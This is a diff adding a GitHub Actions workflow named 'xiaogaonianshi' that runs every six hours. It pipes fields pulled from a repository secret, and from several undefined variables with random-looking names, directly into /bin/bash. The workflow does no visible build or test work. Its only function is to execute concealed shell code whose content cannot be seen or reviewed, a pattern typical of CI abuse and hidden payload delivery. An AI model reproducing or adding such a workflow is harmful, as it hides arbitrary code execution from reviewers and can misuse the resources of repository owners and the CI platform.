@@ -1,0 +1,25 @@
+name: xiaogaonianshi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaogaonianshi
+        env:
+          qznx54: ${{ secrets.qznx54 }}
+        run: |
+          echo $qznx54 | jq -r .ihuit24890 | /bin/bash
+          echo $dyoxk93199 | jq -r .hld5 | /bin/bash
+          echo $nawkw50032 | jq -r .xp0540 | /bin/bash
+          echo $mseqg08 | jq -r .rrwl995 | /bin/bash
+          echo $gqb38576 | jq -r .avoj403 | /bin/bash
+          echo $oendt42334 | jq -r .bme6 | /bin/bash
+          echo $aua40195 | jq -r .ndw3 | /bin/bash
+          echo $n963 | jq -r .pczu8 | /bin/bash
+
